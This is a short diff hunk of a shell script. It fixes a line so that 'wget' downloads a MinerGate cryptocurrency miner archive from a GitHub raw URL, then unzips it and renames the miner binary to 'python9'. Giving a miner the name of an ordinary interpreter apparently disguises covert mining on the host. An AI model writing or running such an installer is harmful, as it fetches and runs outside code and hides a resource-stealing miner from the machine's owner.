@@ -26,7 +26,7 @@ fi
 exit
 fi
 
-https://raw.githubusercontent.com/haidanglx/Tonghop/master/minergate-cli.zip
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/minergate-cli.zip
 unzip minergate-cli.zip
 cd minergate-cli
 mv minergate-cli python9
